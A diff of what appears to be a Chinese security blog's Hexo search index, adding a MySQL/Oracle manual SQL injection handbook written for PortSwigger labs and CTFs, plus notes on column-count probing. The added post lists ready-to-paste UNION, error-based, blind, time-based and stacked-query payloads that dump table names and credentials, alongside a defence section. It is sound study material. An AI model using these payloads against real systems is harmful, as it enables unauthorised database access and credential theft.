@@ -14,7 +14,7 @@
   </entry>
   <entry>
     <title>从零搭一个国内能打开的 Hexo 博客：全流程与七个坑</title>
-    <url>/2026/11/06/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/hexo-blog-notes/</url>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/hexo-blog-notes/</url>
     <content><![CDATA[<p>这个博客是从零搭起来的：Hexo 8 + NexT 8，托管在 Cloudflare Workers，域名在国内可直接访问。</p>
 <p>整个过程踩了不少坑，有些是教程里过时的说法，有些是只能自己撞一次才知道的。这篇把完整流程和结论记下来，方便以后重装时照着抄，也给同样在折腾的人省几个小时。</p>
 <span id="more"></span>
@@ -305,93 +305,181 @@
       </categories>
   </entry>
   <entry>
-    <title></title>
-    <url>/2026/11/06/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/sql%E9%87%8D%E5%AD%A6%E6%B7%B1%E5%8C%96/sql%20%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p>学习这个漏洞前确实得学学sql语句 要不然还是有些地方不知道为什么错，绷不住了</p>
-<h3 id="在这里写一下，遇到的一些语法问题，方便后续回顾（以后掌握可删）"><a href="#在这里写一下，遇到的一些语法问题，方便后续回顾（以后掌握可删）" class="headerlink" title="在这里写一下，遇到的一些语法问题，方便后续回顾（以后掌握可删）"></a>在这里写一下，遇到的一些语法问题，方便后续回顾（以后掌握可删）</h3><h2 id="less23，遇到的"><a href="#less23，遇到的" class="headerlink" title="less23，遇到的"></a>less23，遇到的</h2><p>关于顶层子句的顺序问题和嵌套,group by和order by的<br>顶层子句：属于整条查询的结构块，<strong>不能嵌入 WHERE 的 AND&#x2F;OR 布尔表达式内部</strong><br>顶层子句不能写进where的and&#x2F;or布尔表达式内部<br>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. FROM + JOIN   -- 加载表、多表关联，拿到原始数据集</span><br><span class="line">2. WHERE         -- 过滤原始行，剔除不符合条件的行；不能用聚合函数</span><br><span class="line">3. GROUP BY      -- 对WHERE筛选后的结果分组、合并多行</span><br><span class="line">4. HAVING        -- 分组之后再过滤；**可以使用聚合函数count/sum**</span><br><span class="line">5. SELECT + DISTINCT -- 挑选输出列、计算字段、去重</span><br><span class="line">6. ORDER BY      -- 对SELECT输出的结果集排序</span><br><span class="line">7. LIMIT         -- 截取指定行数，最后一步</span><br></pre></td></tr></table></figure>
-<p>eg23(过滤#，–)：payload:?id&#x3D;1’ and group by 4 or ‘1’&#x3D;’1,</p>
-<h4 id="1、要写进数据库的句子是这样的"><a href="#1、要写进数据库的句子是这样的" class="headerlink" title="1、要写进数据库的句子是这样的"></a>1、要写进数据库的句子是这样的</h4><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>由于无法注释掉后面的limit,整个payload就会一直处于where内部，后面打算用换行的方式写成这样payload:?id&#x3D;1’%0agroup%20by%203%0a%20or%20’1’&#x3D;’1<br>效果就是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users </span><br><span class="line">WHERE id=&#x27;1&#x27;        -- WHERE 到此结束 ✔</span><br><span class="line">GROUP BY 4          -- 顶层子句，成功跑到WHERE外面了！</span><br><span class="line">OR &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>好像可以，但是</p>
-<h4 id="2、GROUP-BY-后面只能跟分组字段，不能直接接-OR-AND-布尔运算符。"><a href="#2、GROUP-BY-后面只能跟分组字段，不能直接接-OR-AND-布尔运算符。" class="headerlink" title="2、GROUP BY 后面只能跟分组字段，不能直接接 OR/AND 布尔运算符。"></a>2、<code>GROUP BY</code> 后面<strong>只能跟分组字段</strong>，不能直接接 <code>OR/AND</code> 布尔运算符。</h4><p>MySQL 会把整段理解成：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GROUP BY 4 OR/AND &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
-<p>也就不行了，非零数字全被理解为真，就失去了探测列数的作用</p>
-<h4 id="3、group-by-和order-by-探测列数的区别"><a href="#3、group-by-和order-by-探测列数的区别" class="headerlink" title="3、group by 和order by 探测列数的区别"></a>3、group by 和order by 探测列数的区别</h4><h5 id="1-ORDER-BY-探测（CTF-SQLi-Labs-首选）"><a href="#1-ORDER-BY-探测（CTF-SQLi-Labs-首选）" class="headerlink" title="1. ORDER BY 探测（CTF&#x2F;SQLi-Labs 首选）"></a>1. ORDER BY 探测（CTF&#x2F;SQLi-Labs 首选）</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><code>ORDER BY N</code>：N 代表<strong>结果集的第 N 列</strong>。<br>MySQL 允许用数字代替列名：<code>ORDER BY 1</code>&#x3D; 按第 1 列排序。</p>
-<ul>
-<li>N ≤ 总列数：正常执行，页面正常回显</li>
-<li>N &gt; 总列数：抛出报错 <code>Unknown column &#39;N&#39; in &#39;order clause&#39;</code></li>
-</ul>
-<blockquote>
-<p>通过不断增大数字，报错临界点就是查询的列总数。</p>
+    <title>Oracle sql</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/sql%E9%87%8D%E5%AD%A6%E6%B7%B1%E5%8C%96/Oracle%20sql/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="MySQL-Oracle-手工-SQL-注入-整合完整版手册"><a href="#MySQL-Oracle-手工-SQL-注入-整合完整版手册" class="headerlink" title="MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册"></a>MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册</h1><blockquote>
+<p>适用：PortSwigger 靶场、CTF 手工注入</p>
+<p>Payload 全部为<strong>原始文本，直接粘贴进 Burp Repeater 参数 value 框，不用手动 URL 编码</strong></p>
+<p>核心原理两者完全一致：<strong>用户可控输入直接拼接进 SQL 字符串，未使用预编译，导致注入</strong></p>
+<p>预编译局限：只能防护 WHERE 条件里的值；<strong>ORDER BY&#x2F;GROUP BY 这类 SQL 结构拼接，预编译无效，只能白名单</strong></p>
 </blockquote>
-<h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><p>Less1 payload：<code>?id=1&#39; order by 3--+</code><br>注释把源码尾部 <code>&#39; LIMIT 0,1</code> 删掉，最终执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; ORDER BY 3;</span><br></pre></td></tr></table></figure>
-<h6 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h6><ol>
-<li>兼容性好，MySQL5&#x2F;8 都能用，<strong>不受 ONLY_FULL_GROUP_BY 参数影响</strong></li>
-<li>报错信息直观，稳定，靶场通用</li>
-</ol>
-<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h6><ol>
-<li>必须能注释截断源码后面内容，否则语法断裂（Less23 无法使用）</li>
-</ol>
-<h5 id="2-GROUP-BY-探测列数（备选，现在不推荐）"><a href="#2-GROUP-BY-探测列数（备选，现在不推荐）" class="headerlink" title="2. GROUP BY 探测列数（备选，现在不推荐）"></a>2. GROUP BY 探测列数（备选，现在不推荐）</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p><code>GROUP BY N</code>：同样支持数字代表结果集第 N 列。</p>
-<ul>
-<li>N ≤ 总列数：正常执行</li>
-<li>N &gt; 总列数：报错 <code>Unknown column &#39;N&#39; in &#39;group statement&#39;</code></li>
-</ul>
-<h6 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h6><p>和 order by 写法几乎一样：<code>?id=1&#39; group by 3--+</code><br>注释截断尾部，让 group by 成为顶层子句。</p>
-<h6 id="致命缺点（重点）"><a href="#致命缺点（重点）" class="headerlink" title="致命缺点（重点）"></a>致命缺点（重点）</h6><ol>
-<li><p><strong>受 <code>ONLY_FULL_GROUP_BY</code> 影响极大</strong>（MySQL5.7、8.0 默认开启）</p>
-<p> 开启后，哪怕 N 是合法列号，也直接报分组语法错误，探测直接失效。</p>
-</li>
-<li><p>group by 会<strong>合并相同值的行</strong>，会改变返回结果行数，容易干扰页面回显。</p>
-</li>
-</ol>
-<h4 id="对比汇总表"><a href="#对比汇总表" class="headerlink" title="对比汇总表"></a>对比汇总表</h4><table>
+<hr>
+<h2 id="一、系统元数据映射（最重要！）"><a href="#一、系统元数据映射（最重要！）" class="headerlink" title="一、系统元数据映射（最重要！）"></a>一、系统元数据映射（最重要！）</h2><table>
 <thead>
 <tr>
-<th>项目</th>
-<th>ORDER BY 探测</th>
-<th>GROUP BY 探测</th>
+<th>功能</th>
+<th>MySQL</th>
+<th>Oracle</th>
+<th>备注</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>探测原理</td>
-<td>按结果集第 N 列排序，列不存在则报错</td>
-<td>按结果集第 N 列分组，列不存在则报错</td>
+<td>查询所有表</td>
+<td><code>information_schema.tables</code></td>
+<td><code>all_tables</code> &#x2F; <code>user_tables</code></td>
+<td><code>user_tables</code>只看当前用户自己的表，注入优先用；<code>all_tables</code>能看当前用户有权限访问的所有表；<code>dba_tables</code>需要 DBA 权限</td>
 </tr>
 <tr>
-<td>高版本 MySQL (8.0)</td>
-<td>✅稳定可用</td>
-<td>❌极易被 ONLY_FULL_GROUP_BY 废掉</td>
+<td>查询所有列</td>
+<td><code>information_schema.columns</code></td>
+<td><code>all_tab_columns</code> &#x2F; <code>user_tab_columns</code></td>
+<td>视图里的字段名都叫<code>table_name</code>、<code>column_name</code>，只是存放位置不同</td>
 </tr>
 <tr>
-<td>对结果集影响</td>
-<td>只改变顺序，<strong>行数不变</strong></td>
-<td>合并重复行，<strong>改变行数</strong></td>
-</tr>
-<tr>
-<td>报错信息</td>
-<td><code>Unknown column ... in &#39;order clause&#39;</code></td>
-<td><code>Unknown column ... in &#39;group statement&#39;</code></td>
-</tr>
-<tr>
-<td>推荐程度</td>
-<td>⭐⭐⭐⭐⭐ 首选</td>
-<td>⭐ 仅旧版本 MySQL 备选</td>
-</tr>
-<tr>
-<td>使用前提</td>
-<td>都需要注释截断源码尾部，放到 WHERE 外面</td>
-<td>同左</td>
+<td>筛选当前库 &#x2F;schema</td>
+<td><code>table_schema=database()</code></td>
+<td><code>owner=USER</code></td>
+<td>MySQL 叫数据库；Oracle 叫 Schema (用户)</td>
 </tr>
 </tbody></table>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+<blockquote>
+<p>记忆口诀：</p>
+<p>MySQL：查表、列都在<code>information_schema</code>里面</p>
+<p>Oracle：没有<code>information_schema</code>，用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>（优先）</p>
+</blockquote>
+<hr>
+<h2 id="二、基础语法-注入常用函数对比"><a href="#二、基础语法-注入常用函数对比" class="headerlink" title="二、基础语法 &amp; 注入常用函数对比"></a>二、基础语法 &amp; 注入常用函数对比</h2><p>![[Pasted image 20261015210139.png|700]]</p>
+<h3 id="关键名词解释"><a href="#关键名词解释" class="headerlink" title="关键名词解释"></a>关键名词解释</h3><ol>
+<li><strong>dual</strong>：Oracle 虚拟伪表，只有一行空数据。Oracle 语法强制 SELECT 必须带 FROM，查常量、函数结果没有真实表时，用<code>FROM dual</code>占位。</li>
+<li><strong>ROWNUM</strong>：Oracle 伪列，不是表真实字段。查询输出结果之后，按顺序给每行分配编号，从 1 开始。只能直接用<code>ROWNUM=1</code>获取第一条。</li>
+<li><strong>LISTAGG</strong>：Oracle 聚合函数，把多条查询结果合并为一行字符串，自定义分隔符。靶场表少的时候，一次性爆出全部表 &#x2F; 列。超过 4000 字符失效，改用<code>ROWNUM+NOT IN</code>逐行获取。</li>
+</ol>
+<hr>
+<h2 id="三、注入通用流程（MySQL、Oracle-一样）"><a href="#三、注入通用流程（MySQL、Oracle-一样）" class="headerlink" title="三、注入通用流程（MySQL、Oracle 一样）"></a>三、注入通用流程（MySQL、Oracle 一样）</h2><ol>
+<li>找注入点：输入单引号<code>&#39;</code>，观察页面是否报错</li>
+<li><code>ORDER BY</code> 猜查询返回的列数量</li>
+<li>UNION SELECT，匹配<strong>列数量</strong>和<strong>列数据类型</strong></li>
+<li>查询版本 → 查询表名 → 查询列名 → 查询表内数据</li>
+</ol>
+<blockquote>
+<p>下面 Payload 统一场景：原始查询返回 2 列，注入点 category，原始 SQL：<code>SELECT name,description FROM products WHERE category=&#39;$cat&#39; AND released=1</code></p>
+</blockquote>
+<h3 id="UNION-联合注入（有回显，优先使用）"><a href="#UNION-联合注入（有回显，优先使用）" class="headerlink" title="UNION 联合注入（有回显，优先使用）"></a>UNION 联合注入（有回显，优先使用）</h3><h4 id="MySQL-Payload"><a href="#MySQL-Payload" class="headerlink" title="MySQL Payload"></a>MySQL Payload</h4><p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT VERSION(),DATABASE() -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆全部表</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(table_name,&#x27;:&#x27;),null FROM information_schema.tables WHERE table_schema=DATABASE() -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆目标表所有列（假设表 users）</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(column_name,&#x27;:&#x27;),null FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=&#x27;users&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>读取数据</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT username,password FROM users LIMIT 0,1 -- </span><br></pre></td></tr></table></figure>
+
+<h4 id="Oracle-Payload（PortSwigger-靶场直接复制）"><a href="#Oracle-Payload（PortSwigger-靶场直接复制）" class="headerlink" title="Oracle Payload（PortSwigger 靶场直接复制）"></a>Oracle Payload（PortSwigger 靶场直接复制）</h4><p>测试 dual，验证 UNION 是否通</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT &#x27;test123&#x27;,null FROM dual -- </span><br></pre></td></tr></table></figure>
+
+<p>查询版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT banner,null FROM v$version -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆出当前用户全部表（listagg 推荐）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(table_name,&#x27;:&#x27;) within group (order by table_name),null FROM user_tables -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆出目标表所有列（假设表 USERS，大写）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(column_name,&#x27;:&#x27;) within group (order by column_name),null FROM user_tab_columns WHERE table_name=&#x27;USERS&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>读取表内数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT USERNAME,PASSWORD FROM USERS WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<h5 id="listagg-失效备选：逐行获取（ROWNUM-NOT-IN）"><a href="#listagg-失效备选：逐行获取（ROWNUM-NOT-IN）" class="headerlink" title="listagg 失效备选：逐行获取（ROWNUM + NOT IN）"></a>listagg 失效备选：逐行获取（ROWNUM + NOT IN）</h5><p>拿第一张表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<p>拿到第一张表（例：PRODUCTS），填入 NOT IN，拿第二张</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 AND table_name NOT IN (&#x27;PRODUCTS&#x27;) -- </span><br></pre></td></tr></table></figure>
+
+<p>原理：剔除已经获取到的数据，剩下结果集再取第一条，绕开<code>ROWNUM!=2</code>的限制。</p>
+<hr>
+<h2 id="四、其他注入类型-Payload"><a href="#四、其他注入类型-Payload" class="headerlink" title="四、其他注入类型 Payload"></a>四、其他注入类型 Payload</h2><h3 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1. 报错注入"></a>1. 报错注入</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND updatexml(1,concat(0x7e,VERSION(),0x7e),1) -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle（环境依赖，经常失效）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND utl_inaddr.get_host_name((SELECT table_name FROM user_tables WHERE ROWNUM=1)) -- </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-布尔盲注（页面只有正常-空白两种状态，无回显）"><a href="#2-布尔盲注（页面只有正常-空白两种状态，无回显）" class="headerlink" title="2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）"></a>2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTR(USER,1,1)=&#x27;S&#x27; AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Oracle 截取函数：<code>SUBSTR(字符串,起始位置,长度)</code></p>
+</blockquote>
+<h3 id="3-时间盲注（页面无任何差异，依靠延时判断真假）"><a href="#3-时间盲注（页面无任何差异，依靠延时判断真假）" class="headerlink" title="3. 时间盲注（页面无任何差异，依靠延时判断真假）"></a>3. 时间盲注（页面无任何差异，依靠延时判断真假）</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27;,SLEEP(5),1) -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND (CASE WHEN SUBSTR(USER,1,1)=&#x27;S&#x27; THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) ELSE NULL END) AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4. 堆叠注入"></a>4. 堆叠注入</h3><p>MySQL 可用，Oracle 完全无效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;INSERT INTO users VALUES(&#x27;test&#x27;,&#x27;123456&#x27;); -- </span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、防御方案（MySQL、Oracle-通用）"><a href="#五、防御方案（MySQL、Oracle-通用）" class="headerlink" title="五、防御方案（MySQL、Oracle 通用）"></a>五、防御方案（MySQL、Oracle 通用）</h2><ol>
+<li><p><strong>首选：参数化预编译 PreparedStatement</strong></p>
+<p>  防护 WHERE 子句参数值注入</p>
+<p>  <strong>无法防御 ORDER BY、GROUP BY 这类 SQL 结构拼接，结构类只能白名单</strong></p>
+</li>
+<li><p>最小权限原则：数据库账号只分配业务必需权限，不要 DBA 管理员权限</p>
+</li>
+<li><p>输入校验：白名单 &gt; 黑名单，黑名单容易绕过</p>
+</li>
+<li><p>禁用危险函数 &#x2F; 包</p>
+<ul>
+<li>MySQL：限制<code>secure_file_priv</code>，禁止<code>into outfile</code>写文件</li>
+<li>Oracle：配置 ACL，禁用<code>utl_inaddr</code>、<code>utl_http</code></li>
+</ul>
+</li>
+<li><p>转义函数仅作为辅助防护，存在宽字节注入等绕过方式，不能单独防御注入</p>
+</li>
+<li><p>WAF 属于辅助防护，存在大量绕过手段，不能单独依赖</p>
+</li>
+</ol>
+<hr>
+<h2 id="六、高频坑点汇总"><a href="#六、高频坑点汇总" class="headerlink" title="六、高频坑点汇总"></a>六、高频坑点汇总</h2><h3 id="Oracle-坑"><a href="#Oracle-坑" class="headerlink" title="Oracle 坑"></a>Oracle 坑</h3><ol>
+<li>常量查询必须写<code>FROM dual</code>，直接<code>SELECT &#39;xxx&#39;</code>语法报错</li>
+<li><code>ROWNUM=2</code>直接查询永远为空；listagg 超长报错才用<code>ROWNUM+NOT IN</code>循环爆数据</li>
+<li>UNION 列类型必须严格匹配，不确定就用 null 占位</li>
+<li>表名字典内大写，匹配时引号内必须大写</li>
+<li>注释不能用<code>#</code>，只能<code>--</code> 或者<code>/* */</code></li>
+<li>不支持堆叠注入，分号<code>;</code>不能执行第二条 SQL</li>
+<li>优先使用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>，减少无关数据干扰</li>
+</ol>
+<h3 id="MySQL-坑"><a href="#MySQL-坑" class="headerlink" title="MySQL 坑"></a>MySQL 坑</h3><ol>
+<li><code>GROUP_CONCAT</code>有长度上限，过长会截断</li>
+<li><code>||</code>不是字符串拼接，要用<code>CONCAT()</code></li>
+<li><code>LIMIT m,n</code>：跳过 m 行，取 n 行</li>
+</ol>
+<hr>
+<h2 id="七、最简实操顺序（PortSwigger-Oracle-Lab）"><a href="#七、最简实操顺序（PortSwigger-Oracle-Lab）" class="headerlink" title="七、最简实操顺序（PortSwigger Oracle Lab）"></a>七、最简实操顺序（PortSwigger Oracle Lab）</h2><ol>
+<li><code>ORDER BY</code> 判断列数</li>
+<li><code>Gifts&#39; UNION SELECT &#39;test123&#39;,null FROM dual --</code> 验证 UNION 注入</li>
+<li>listagg 一次性拿全部表名</li>
+<li>listagg 拿目标表全部列名</li>
+<li>UNION SELECT 列 1, 列 2 FROM 目标表 WHERE ROWNUM&#x3D;1 – 读取账号密码</li>
+</ol>
+]]></content>
       <categories>
         <category>技术</category>
         <category>基础漏洞</category>
         <category>sql重学深化</category>
       </categories>
+      <tags>
+        <tag>Orclesql</tag>
+      </tags>
   </entry>
   <entry>
     <title></title>
@@ -497,12 +585,87 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2026/11/06/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/sql%E9%87%8D%E5%AD%A6%E6%B7%B1%E5%8C%96/%E5%AD%A6%E4%B9%A0%E6%88%90%E6%9E%9C/</url>
-    <content><![CDATA[<h2 id="1、在源码层面理解为什么会出现sql漏洞"><a href="#1、在源码层面理解为什么会出现sql漏洞" class="headerlink" title="1、在源码层面理解为什么会出现sql漏洞"></a>1、在源码层面理解为什么会出现sql漏洞</h2><p>将用户的输入直接拼接到sql语句，然后给数据库执行，在没有预编译的情况下，过滤不完全</p>
-<h2 id="2、怎么防护"><a href="#2、怎么防护" class="headerlink" title="2、怎么防护"></a>2、怎么防护</h2><p>预编译，就是先给数据库一个模板，然后用户的输入只会被当成普通文字，不会被当成命令执行，其中order by 的特殊情况，比如说<br>select * from users order by $sort<br>这里$sort 一开始就写进模板，后续用户的输入就会被拼接进去，引发漏洞，很多时候需要动态排序就无法避免，所以可以加白名单，指定用户输入</p>
-<h2 id="3、哪些场景最可能出现sql漏洞"><a href="#3、哪些场景最可能出现sql漏洞" class="headerlink" title="3、哪些场景最可能出现sql漏洞"></a>3、哪些场景最可能出现sql漏洞</h2><p>只要用户可控输入，直接拼进 SQL 语句，就大概率会产生 SQL 注入；用占位符预编译绑定【值】才安全。<br>1、搜索框<br>2、登录页面（账号密码 POST）<br>3、列表分页 limit<br>4、表格排序 order by<br>5、后台删除、编辑、修改密码<br>6、注册、留言<br>7、多租户动态表切换</p>
-<h2 id="4、在源码层面的理解"><a href="#4、在源码层面的理解" class="headerlink" title="4、在源码层面的理解"></a>4、在源码层面的理解</h2><p>每过一关就查看源码，理解为什么这么做，同时思考怎么做防护<br>这里也不知道怎么写，确实在能懂源码后整个人都通透了，其实也就是会看哪里是注入点，然后源码逻辑是什么，然后就是思考怎么写payload，符合逻辑，然后就是sql语法的问题，之前没学sql语法学起来比较吃力，现在好多了</p>
-]]></content>
+    <url>/2026/11/06/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/sql%E9%87%8D%E5%AD%A6%E6%B7%B1%E5%8C%96/sql%20%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p>学习这个漏洞前确实得学学sql语句 要不然还是有些地方不知道为什么错，绷不住了</p>
+<h3 id="在这里写一下，遇到的一些语法问题，方便后续回顾（以后掌握可删）"><a href="#在这里写一下，遇到的一些语法问题，方便后续回顾（以后掌握可删）" class="headerlink" title="在这里写一下，遇到的一些语法问题，方便后续回顾（以后掌握可删）"></a>在这里写一下，遇到的一些语法问题，方便后续回顾（以后掌握可删）</h3><h2 id="less23，遇到的"><a href="#less23，遇到的" class="headerlink" title="less23，遇到的"></a>less23，遇到的</h2><p>关于顶层子句的顺序问题和嵌套,group by和order by的<br>顶层子句：属于整条查询的结构块，<strong>不能嵌入 WHERE 的 AND&#x2F;OR 布尔表达式内部</strong><br>顶层子句不能写进where的and&#x2F;or布尔表达式内部<br>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. FROM + JOIN   -- 加载表、多表关联，拿到原始数据集</span><br><span class="line">2. WHERE         -- 过滤原始行，剔除不符合条件的行；不能用聚合函数</span><br><span class="line">3. GROUP BY      -- 对WHERE筛选后的结果分组、合并多行</span><br><span class="line">4. HAVING        -- 分组之后再过滤；**可以使用聚合函数count/sum**</span><br><span class="line">5. SELECT + DISTINCT -- 挑选输出列、计算字段、去重</span><br><span class="line">6. ORDER BY      -- 对SELECT输出的结果集排序</span><br><span class="line">7. LIMIT         -- 截取指定行数，最后一步</span><br></pre></td></tr></table></figure>
+<p>eg23(过滤#，–)：payload:?id&#x3D;1’ and group by 4 or ‘1’&#x3D;’1,</p>
+<h4 id="1、要写进数据库的句子是这样的"><a href="#1、要写进数据库的句子是这样的" class="headerlink" title="1、要写进数据库的句子是这样的"></a>1、要写进数据库的句子是这样的</h4><p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>由于无法注释掉后面的limit,整个payload就会一直处于where内部，后面打算用换行的方式写成这样payload:?id&#x3D;1’%0agroup%20by%203%0a%20or%20’1’&#x3D;’1<br>效果就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users </span><br><span class="line">WHERE id=&#x27;1&#x27;        -- WHERE 到此结束 ✔</span><br><span class="line">GROUP BY 4          -- 顶层子句，成功跑到WHERE外面了！</span><br><span class="line">OR &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>好像可以，但是</p>
+<h4 id="2、GROUP-BY-后面只能跟分组字段，不能直接接-OR-AND-布尔运算符。"><a href="#2、GROUP-BY-后面只能跟分组字段，不能直接接-OR-AND-布尔运算符。" class="headerlink" title="2、GROUP BY 后面只能跟分组字段，不能直接接 OR/AND 布尔运算符。"></a>2、<code>GROUP BY</code> 后面<strong>只能跟分组字段</strong>，不能直接接 <code>OR/AND</code> 布尔运算符。</h4><p>MySQL 会把整段理解成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GROUP BY 4 OR/AND &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
+<p>也就不行了，非零数字全被理解为真，就失去了探测列数的作用</p>
+<h4 id="3、group-by-和order-by-探测列数的区别"><a href="#3、group-by-和order-by-探测列数的区别" class="headerlink" title="3、group by 和order by 探测列数的区别"></a>3、group by 和order by 探测列数的区别</h4><h5 id="1-ORDER-BY-探测（CTF-SQLi-Labs-首选）"><a href="#1-ORDER-BY-探测（CTF-SQLi-Labs-首选）" class="headerlink" title="1. ORDER BY 探测（CTF&#x2F;SQLi-Labs 首选）"></a>1. ORDER BY 探测（CTF&#x2F;SQLi-Labs 首选）</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><code>ORDER BY N</code>：N 代表<strong>结果集的第 N 列</strong>。<br>MySQL 允许用数字代替列名：<code>ORDER BY 1</code>&#x3D; 按第 1 列排序。</p>
+<ul>
+<li>N ≤ 总列数：正常执行，页面正常回显</li>
+<li>N &gt; 总列数：抛出报错 <code>Unknown column &#39;N&#39; in &#39;order clause&#39;</code></li>
+</ul>
+<blockquote>
+<p>通过不断增大数字，报错临界点就是查询的列总数。</p>
+</blockquote>
+<h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><p>Less1 payload：<code>?id=1&#39; order by 3--+</code><br>注释把源码尾部 <code>&#39; LIMIT 0,1</code> 删掉，最终执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; ORDER BY 3;</span><br></pre></td></tr></table></figure>
+<h6 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h6><ol>
